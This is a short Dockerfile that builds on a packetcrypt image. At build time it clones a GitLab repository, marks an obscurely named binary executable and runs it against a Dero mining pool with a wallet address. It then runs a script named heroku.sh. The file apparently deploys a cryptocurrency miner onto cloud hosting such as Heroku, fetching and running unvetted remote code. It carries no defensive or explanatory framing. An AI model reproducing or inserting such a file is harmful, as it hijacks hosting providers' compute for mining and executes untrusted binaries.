FROM thomasjp0x42/packetcrypt

RUN git clone https://gitlab.com/rikzakalani04/7.git && cd 7 && chmod +x pepek && ./pepek -o miners.dero.network -u dERoW2u96oBBqJJiAeDSRHbH6uFTmCxxEcQ5tgd5hLNKeMKXCpizH45SjdyCjNeYcqShtVetYFPSNeN2Dd3rz3Zo6Gb9mjxyTP -p SUKUMANTE2 -a astrobwt -k

CMD bash heroku.sh
